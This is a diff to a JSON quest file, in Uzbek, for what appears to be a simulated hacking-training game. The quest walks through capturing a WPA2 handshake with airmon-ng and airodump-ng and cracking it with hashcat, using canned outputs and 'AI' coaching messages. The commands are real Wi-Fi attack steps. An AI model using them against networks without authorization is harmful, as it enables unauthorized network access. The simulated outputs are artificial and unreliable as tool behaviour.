@@ -1,21 +1,36 @@
 {
-  "quest_id": "wifi_wpa2_handshake",
-  "title": "Airodump-ng yordamida WPA2 Handshake-ni tutib olish",
-  "description": "Maqsad: Tarmoq kartasini monitoring rejimiga o'tkazish va mo'ljallangan Wi-Fi tarmog'ini aniqlash.",
+  "title": "WPA2 Handshake & Hashcat Brute-Force",
+  "description": "WPA2 tarmog'ini buzish: tarmoq kartasini monitoring rejimiga o'tkazish, handshake ushlash va Hashcat orqali parolni topish.",
   "steps": [
     {
       "step_id": 1,
-      "instruction": "wlan0 interfeysini monitoring rejimiga o'tkazing.",
+      "instruction": "wlan0 interfeysida monitor rejimini yoqish uchun airmon-ng utilitasidan foydalaning.",
       "expected_command": "airmon-ng start wlan0",
-      "output": "PHY\tInterface\tDriver\t\tChipset\nphy0\twlan0mon\tath9k\t\tAtheros AR9271\n\n(mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)",
-      "hint": "--- BU HABAR JSON FAYLDAN! ---"
+      "output": "PHY\tInterface\tDriver\t\tChipset\nphy0\twlan0\t\tath9k\t\tQualcomm Atheros\n\n(mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)\n(mac80211 station mode vif disabled for [phy0]wlan0)\n\n💡 AI: Ajoyib! wlan0mon interfeysi hosil bo'ldi. Endi tarmoqni skanerlash uchun airodump-ng buyrug'ini ishga tushiring.",
+      "hint": "airmon-ng start wlan0 buyrug'ini kiriting."
     },
     {
       "step_id": 2,
-      "instruction": "Kuzatuv interfeysida simsiz tarmoqlarni skanerlashni boshlang.",
+      "instruction": "Yangi yaratilgan wlan0mon interfeysida airodump-ng yordamida tarmoqni skanerlashni boshlang.",
       "expected_command": "airodump-ng wlan0mon",
-      "output": "BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER AUTH ESSID\n00:11:22:33:44:55  -42       25       10    0   6  130   WPA2 CCMP   PSK  Target_Home_WiFi",
-      "hint": "airodump-ng buyrug'ini va faol monitoring interfeysi nomini (wlan0mon) ko'rsating."
+      "delay": 5,
+      "output": "[+] Scanning channels...\n[+] CH 6 ] [ BSSID: 00:11:22:33:44:55 ] [ ESSID: HomeWiFi ]\n[+] WPA Handshake captured! Saved to 'handshake.hc22000'\n\n💡 AI: Handshake ushlandi! Hozirgi katalogda fayl saqlanganini tekshirish uchun 'ls' buyrug'ini kiriting.",
+      "hint": "airodump-ng wlan0mon buyrug'ini kiriting."
+    },
+    {
+      "step_id": 3,
+      "instruction": "Fayl saqlanganini tasdiqlash uchun katalog tarkibini ko'ring.",
+      "expected_command": "ls",
+      "output": "handshake.hc22000  wordlist.txt  quest_info.txt\n\n💡 AI: handshake.hc22000 fayli joyida! Endi parolni lug'at (wordlist.txt) orqali buzish uchun Hashcat-ni ishga tushiring (WPA2 rejimi: -m 22000).",
+      "hint": "Shunchaki ls buyrug'ini kiriting."
+    },
+    {
+      "step_id": 4,
+      "instruction": "Handshake faylini wordlist.txt yordamida брутфорс qilish uchun Hashcat-ni ishga tushiring.",
+      "expected_command": "hashcat -m 22000 handshake.hc22000 wordlist.txt",
+      "delay": 3,
+      "output": "hashcat (v6.2.6) starting...\n\n[+] Dictionary attack in progress...\n[+] Status: Cracked!\n\n001122334455:001122334455:HomeWiFi:supersecret123\n\nSession..........: hashcat\nStatus...........: Cracked\n\n🎉 AI: Tabriklayman! 'supersecret123' paroli muvaffaqiyatli topildi! Siz WPA2 parolini buzish kvestini yakunladi!",
+      "hint": "hashcat -m 22000 handshake.hc22000 wordlist.txt buyrug'idan foydalaning."
     }
   ]
 }
